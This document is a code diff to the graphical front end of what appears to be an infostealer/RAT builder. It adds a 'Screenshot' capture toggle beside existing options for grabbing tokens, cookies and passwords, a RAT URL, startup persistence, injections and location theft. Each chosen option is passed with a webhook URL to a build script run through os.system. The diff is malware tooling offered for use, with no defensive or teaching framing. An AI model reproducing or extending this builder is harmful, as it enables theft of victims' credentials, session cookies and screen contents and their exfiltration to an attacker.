@@ -29,6 +29,7 @@ xmalicious = False
 xlocation = False
 xroblox = False
 xrat = False
+xscreenshot = False
 xraturl = ""
 xping = False
 xwehookurl = ""
@@ -76,6 +77,14 @@ def change_passwords():
         ui.notify("Passwords Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
     ui.notify("Passwords Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
+    
+def change_screenshots():
+    global xscreenshot
+    xscreenshot = not xscreenshot
+    if xscreenshot:
+        ui.notify("Screenshot has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
+        return
+    ui.notify("Screenshot has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
     
 def change_malicious():
     global xmalicious
@@ -161,9 +170,8 @@ def __build():
     print(path)
     if xraturl == "":
         xraturl = ".rat"
-    msg = f"start cmd /k py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox}"
+    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping}"
     os.system(msg)
-    ui.notify("Build has finished!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
                     
 def _makebuild():
     if xwehookurl == "":
@@ -206,6 +214,7 @@ def _functions():
                     ui.checkbox('Token', on_change=change_tokens).props('inline color=green')
                     ui.checkbox('Cookie', on_change=change_cookies).props('inline color=green')
                     ui.checkbox('Password', on_change=change_passwords).props('inline color=green')
+                    ui.checkbox('Screenshot', on_change=change_screenshots).props('inline color=green')
                     
                 with ui.column():
                     ui.checkbox('Malicious', on_change=change_malicious).props('inline color=green')
